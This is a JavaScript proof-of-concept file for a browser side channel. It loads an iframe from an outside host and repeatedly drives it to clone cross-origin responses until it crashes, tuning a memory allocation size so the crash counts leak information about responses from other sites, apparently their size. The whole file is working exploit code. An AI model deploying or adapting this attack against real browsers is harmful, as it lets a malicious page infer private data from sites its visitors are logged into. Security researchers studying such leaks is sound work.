'use strict';

const IFRAME_URL = "https://notsheddow.xyz/resp_clone/iframe.html"

const KB = 1024;
const MB = 1024*1024;
const GB = 1024*1024*1024;

addEventListener("load", function() {
    let f = document.createElement('iframe');
    f.src = IFRAME_URL;
    document.body.appendChild(f);
});

async function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function wait_until_frame_has_crashed() {
    while (frames[0].frames.length > 0) {
        await wait(1);
    }
}

async function wait_until_frame_has_loaded() {
    while (frames[0].frames.length == 0) {
        await wait(1);
    }
}

async function reload_iframe() {
    frames[0].location = "about:blank";
    await wait(20);
    frames[0].location = IFRAME_URL
    await wait_until_frame_has_loaded();
}

async function get_max_alloc_size() {
    let size = 0;
    function msg_handler(event) {
        size = event.data;
    }

    addEventListener("message", msg_handler);
    frames[0].postMessage({action: "alloc_until_crash"}, "*");
    await wait_until_frame_has_crashed();
    removeEventListener("message", msg_handler);

    await reload_iframe();
    return size;
}

async function get_count(url, alloc_size) {
    let count = 0;
    function msg_handler(event) {
        count = event.data;
    }

    addEventListener("message", msg_handler);
    frames[0].postMessage({action: "clone_until_crash", url, alloc_size}, "*");
    await wait_until_frame_has_crashed();
    removeEventListener("message", msg_handler);

    await reload_iframe();
    return count;
}

async function get_samples(url, alloc_size, n = 5) {
    let samples = [];
    for (let i = 0; i < n; i++) {
        samples.push(await get_count(url, alloc_size));
    }
    return samples;
}

async function get_it(url, alloc_size) {
    let samples = await get_samples(url, alloc_size, 3);
    samples.sort((a, b) => a-b);
    return samples[1];
}

async function tune_for_url(url, initial_size) {
    let size = initial_size;
    let measurement = await get_it(url, size);
    while (!(50 < measurement && measurement < 100)) {
        console.log(measurement);
        let delta = measurement - 75;
        size += delta*32*KB;
        measurement = await get_it(url, size);
    }
    console.log(measurement);

    return size;
}
